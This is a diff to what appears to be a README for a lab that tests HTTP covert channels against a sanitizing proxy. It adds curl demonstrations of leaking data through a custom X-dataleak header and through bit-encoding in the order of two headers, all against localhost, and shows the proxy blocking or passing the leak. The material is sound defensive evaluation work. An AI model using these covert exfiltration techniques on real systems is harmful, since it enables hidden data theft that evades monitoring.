@@ -345,6 +345,8 @@ Before each test, the scripts clear the server state with `DELETE /clear`.
 
 ### 7.1 Dedicated header: direct server leak succeeds
 
+By interacting directly with the malicious server on port 8001, the X-dataleak header is processed without any validation or filtering.
+
 ```bash
 curl -X DELETE http://localhost:8001/clear
 
@@ -366,6 +368,8 @@ Y2lhbw==
 
 ### 7.2 Dedicated header: proxy blocks the leak
 
+By sending the request through the proxy on port 8000 with implicit protection, the proxy intercepts the non-standard header and drops it.
+
 ```bash
 curl -X DELETE http://localhost:8001/clear
 
@@ -386,6 +390,138 @@ Expected output:
 ```
 
 The empty output means that the proxy forwarded the request but removed the data used by the covert channel.
+
+### 7.3 Proxy transparent bypass (Unprotected mode) 
+
+By passing an explicit "enabled": false flag during setup, the proxy registers the route but intentionally skips the sanitization layer.
+
+```bash
+# Clear previous configurations
+curl -X DELETE http://localhost:8001/clear
+
+# Register the entrypoint on the proxy explicitly disabling protection
+curl -X POST http://localhost:8000/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_dh_unprotected", "type": "dedicatedheader", "enabled": false}'
+
+# Send the payload through the proxy
+curl -X PUT http://localhost:8000/demo_dh_unprotected \
+  -H "X-dataleak: Y2lhbw=="
+
+# Verify that the leak successfully reached the backend
+curl -X GET http://localhost:8000/demo_dh_unprotected
+```
+
+Expected output:
+
+```text
+Y2lhbw==
+```
+
+### 7.4 Direct server leak succeeds (Bypassing the proxy)
+
+This technique exfiltrates data bit-by-bit by swapping the physical transmission order of two consecutive headers (Header-A and Header-B). If Header-A < Header-B, a 0 bit is registered; otherwise, a 1 bit is registered.
+The following commands simulate transmitting the letter 't' (01110100), followed by 8 consecutive 0 bits as the string delimiter (STOP sequence).
+
+```bash
+# Clear previous configurations
+curl -X DELETE http://localhost:8001/clear
+
+# Register the entrypoint directly on the server
+curl -X POST http://localhost:8001/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_ho_direct", "type": "headersorder"}'
+
+# Send 8 bits representing 't' (01110100)
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-A: 1" -H "Header-B: 1" # bit 0
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-B: 1" -H "Header-A: 1" # bit 1
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-B: 1" -H "Header-A: 1" # bit 1
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-B: 1" -H "Header-A: 1" # bit 1
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-A: 1" -H "Header-B: 1" # bit 0
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-B: 1" -H "Header-A: 1" # bit 1
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-A: 1" -H "Header-B: 1" # bit 0
+curl -X PUT http://localhost:8001/demo_ho_direct -H "Header-A: 1" -H "Header-B: 1" # bit 0
+
+# Send 8 consecutive 0 bits as the string delimiter (STOP sequence)
+for i in {1..8}; do curl -s -X PUT http://localhost:8001/demo_ho_direct -H "Header-A: 1" -H "Header-B: 1"; done
+
+# Collect the reconstructed text from the server
+curl -X GET http://localhost:8001/demo_ho_direct
+```
+
+Expected output:
+
+```text
+t
+```
+
+### 7.5 Proxy neutralizes the covert channel (Protected mode)
+
+When sending the same exact sequence to port 8000, the proxy enforces a predefined native order on incoming headers, altering the malicious sequence before it reaches the backend.
+
+```bash
+# Clear previous configurations
+curl -X DELETE http://localhost:8001/clear
+
+# Register the entrypoint on the proxy with active protection
+curl -X POST http://localhost:8000/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_ho_proxy", "type": "headersorder"}'
+
+# Send the same bit stream representing 't' through the proxy
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_proxy -H "Header-A: 1" -H "Header-B: 1"
+for i in {1..8}; do curl -s -X PUT http://localhost:8000/demo_ho_proxy -H "Header-A: 1" -H "Header-B: 1"; done
+
+# Check the final string reconstructed by the server backend
+curl -X GET http://localhost:8000/demo_ho_proxy
+```
+
+Expected output:
+
+```text
+ý<Þ&
+```
+(Or any other corrupted character sequence. The output string will be broken or empty because the proxy standardized the transmission order of the keys, corrupting the hidden payload).
+
+### 7.6 Proxy transparent bypass (Unprotected mode)
+
+```bash
+# Clear previous configurations
+curl -X DELETE http://localhost:8001/clear
+
+# Register the entrypoint on the proxy explicitly disabling protection
+curl -X POST http://localhost:8000/setup \
+  -H "Content-Type: application/json" \
+  -d '{"entrypoint": "demo_ho_unprotected", "type": "headersorder", "enabled": false}'
+
+# Send the bit stream representing 't' through the proxy
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-B: 1" -H "Header-A: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-A: 1" -H "Header-B: 1"
+curl -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-A: 1" -H "Header-B: 1"
+for i in {1..8}; do curl -s -X PUT http://localhost:8000/demo_ho_unprotected -H "Header-A: 1" -H "Header-B: 1"; done
+
+# Verify that the character was decoded successfully
+curl -X GET http://localhost:8000/demo_ho_unprotected
+```
+
+Expected output:
+
+```text
+t
+```
+
 
 ---
 
